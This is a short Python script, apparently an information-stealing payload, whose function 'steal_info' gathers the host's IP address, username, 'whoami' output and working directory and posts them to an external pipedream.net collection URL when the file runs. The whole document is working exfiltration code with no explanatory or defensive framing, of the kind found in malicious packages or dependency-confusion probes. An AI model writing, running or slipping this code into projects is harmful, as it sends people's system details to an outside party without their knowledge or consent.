import requests
import socket
import getpass
import os

def steal_info():
 ip = socket.gethostbyname(socket.gethostname())
 username = getpass.getuser()
 whoami = os.popen('whoami').read().strip()
 cwd = os.getcwd()

 url = "https://eoava4ly5m9snxw.m.pipedream.net/collect"
 data = {'ip': ip, 'username': username, 'whoami': whoami, 'cwd': cwd}
 
 try:
 response = requests.post(url, json=data)
 print("Data sent successfully.")
 except Exception as e:
 print(f"Failed to send data: {e}")

if __name__ == "__main__":
 steal_info()

